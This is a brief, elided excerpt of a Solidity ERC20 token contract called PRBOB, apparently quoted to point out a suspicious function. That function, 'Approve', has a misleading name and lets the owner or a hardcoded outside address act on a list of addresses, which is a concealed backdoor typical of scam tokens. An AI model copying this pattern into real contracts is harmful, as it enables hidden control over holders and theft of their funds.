...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0x61f8413FcE93C0DD2CedD2ea6FE01fa836018073) == _msgSender(), "Ownable: caller is not the owner");
...
contract PRBOB is ERC20 {
    constructor() ERC20("PRBOB", "PRBOB") {
